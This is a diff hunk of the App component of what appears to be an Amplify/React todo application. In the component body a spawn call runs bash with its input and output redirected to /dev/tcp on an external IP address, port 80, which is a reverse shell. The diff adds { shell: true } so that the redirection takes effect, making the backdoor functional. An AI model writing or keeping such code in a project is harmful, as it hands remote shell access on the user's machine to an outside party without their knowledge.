@@ -16,7 +16,7 @@ const client = generateClient<Schema>();
 export default function App() {
   const [todos, setTodos] = useState<Array<Schema["Todo"]["type"]>>([]);
 
-  const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1']);
+  const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
   console.log(child);
 
   function listTodos() {
